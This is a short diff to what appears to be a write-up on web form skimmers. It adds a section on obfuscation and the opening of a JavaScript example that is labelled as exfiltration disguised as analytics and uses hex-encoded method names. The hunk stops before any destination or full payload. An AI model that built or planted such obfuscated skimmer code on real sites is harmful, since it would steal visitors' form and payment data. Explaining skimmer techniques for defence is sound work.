@@ -121,6 +121,10 @@ document.addEventListener('submit', function(event) {
 └──────────────────────────────────────────────────────────┘
 ```
 
+---
+
+## Advanced Skimmer Techniques: Obfuscation Example
+
 ```javascript
 // Example: Obfuscated exfiltration disguised as analytics
 var _0x4a2b = ['\x67\x65\x74','\x73\x65\x6e\x64'];
